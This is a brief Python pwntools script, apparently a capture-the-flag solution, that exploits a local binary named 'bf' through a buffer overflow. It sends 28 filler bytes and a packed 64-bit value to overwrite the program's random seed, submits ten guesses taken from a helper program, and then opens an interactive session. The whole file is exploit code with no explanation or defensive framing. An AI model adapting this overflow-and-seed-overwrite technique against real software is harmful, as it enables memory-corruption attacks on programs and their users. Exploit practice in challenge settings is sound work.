#!/usr/bin/python

from pwn import *

sh = process("./bf")
seedgenerator = process('./seed')
seed = seedgenerator.recv().split('\n')
log.info(seed)

context.log_level = 'debug'

def overWriteSeed():
    sh.recv()
    sh.sendline('1')
    sh.recv()
    payload = 'a' * 28 + p64(0x0101010101010101)
    sh.sendline(payload)

overWriteSeed()

for i in range(10):
    sh.recvuntil('guess:')
    sh.sendline(str(seed[i]))

print sh.recv()
sh.interactive()

